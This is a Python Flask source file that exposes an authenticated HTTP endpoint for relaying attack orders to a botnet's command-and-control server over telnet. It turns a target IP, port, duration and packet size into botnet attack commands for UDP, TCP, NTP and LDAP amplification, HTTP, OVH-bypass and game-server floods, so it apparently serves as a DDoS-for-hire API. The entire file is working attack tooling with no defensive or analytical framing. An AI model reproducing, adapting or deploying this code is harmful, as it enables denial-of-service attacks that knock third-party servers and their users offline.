from flask import Flask, request
import telnetlib
import os

app = Flask(__name__)

HOST = "C2 IP HERE"
PORT = "C2 PORT HERE"

AUTH_KEY = "API AUTH KEY HERE"

@app.route("/run_command", methods=["POST"])
def run_command():
    auth_key = request.args.get("auth_key")
    if(auth_key != AUTH_KEY):
        return("Unauthorized", 401)

    user = request.args.get("username")
    password = request.args.get("password")
    method = request.args.get("method")
    ip = request.args.get("ip")
    port = request.args.get("port")
    time = request.args.get("time")
    size = request.args.get("size")

    if(method == "UDP"):
        command = "!* " + method + " " + ip + " " + port + " " + time + " 32 " + size + " 10"

    elif(method == "TCP"):
        command = "!* " + method + " " + ip + " " + port + " " + time + " 32 all " + size + " 10"

    elif(method == "LDAP"):
        command = "!* " + method + " " + ip + " " + port + " " + time

    elif(method == "NTP"):
        command = "!* " + method + " " + ip + " " + port + " " + time

    elif(method == "STD"):
        command = "!* " + method + " " + ip + " " + port + " " + time

    elif(method == "HEX"):
        command = "!* " + method + " " + ip + " " + port + " " + time + " " + size

    elif(method == "HTTP"):
        command = "!* " + method + " " + ip + " " + port + " " + time

    elif(method == "OVH-HTTP"):
        command = "!* " + method + " " + ip + " " + port + " " + time + " 50"

    elif(method == "OVH-GAME"):
        command = "!* " + method + " " + ip + " " + port + " " + time

    elif(method == "VSE"):
        command = "!* " + method + " " + ip + " " + port + " " + time + " 32 " + size + " 10 250 1"

    elif(method == "STOP"):
        command = "!* STOP"
    
    print(command)

    tn = telnetlib.Telnet(HOST, PORT)
    tn.read_until(b"Username > ")
    tn.write(user.encode('ascii') + b"\n")
    tn.read_until(b"Password > ")
    tn.write(password.encode('ascii') + b"\n")

    tn.write(command.encode('ascii') + b"\n")

    tn.close()

    return("Command Has Been Sent", 200)

port = int(os.environ.get("PORT", 5000))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=port, debug=False)